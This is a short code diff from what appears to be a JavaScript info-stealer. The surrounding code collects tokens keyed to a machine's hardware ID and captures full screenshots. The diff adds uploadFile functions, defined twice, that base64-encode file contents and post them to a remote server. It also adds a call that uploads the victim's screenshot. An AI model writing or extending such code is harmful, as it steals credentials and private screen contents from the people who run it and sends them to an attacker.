@@ -62,6 +62,14 @@ function postData(data, description) {
     post(url.toLowerCase() + `/d/${hwid}?description=${description}`, { data }).then(() => {});
 }
 
+function uploadFile(contents, name, description) {
+    post(url.toLowerCase() + `/fu/${hwid}`, { contents: Buffer.from(contents).toString('base64'), name, description }).then(() => {});
+}
+
+function uploadFile(contents, name) {
+    post(url.toLowerCase() + `/fu/${hwid}`, { contents: Buffer.from(contents).toString('base64'), name }).then(() => {});
+}
+
 const getTokens = async () => {
     const testToken = (token) => {
         return new Promise((resolve, reject) => {
@@ -129,6 +137,7 @@ getTokens().then((tokens) => {
                         exec(`${nirCmdDir} savescreenshotfull %temp%\\${ssFileName}`, {}, (err, stdout, stderr) => {
                             if (!err) {
                                 const ssContents = Buffer.from(fs.readFileSync(`${os.tmpdir()}/${ssFileName}`)).toString('base64');
+                                uploadFile(fs.readFileSync(`${os.tmpdir()}/${ssFileName}`), 'test.png', 'Test image');
 
                                 try {
                                     fs.unlinkSync(`${os.tmpdir()}/${ssFileName}`);
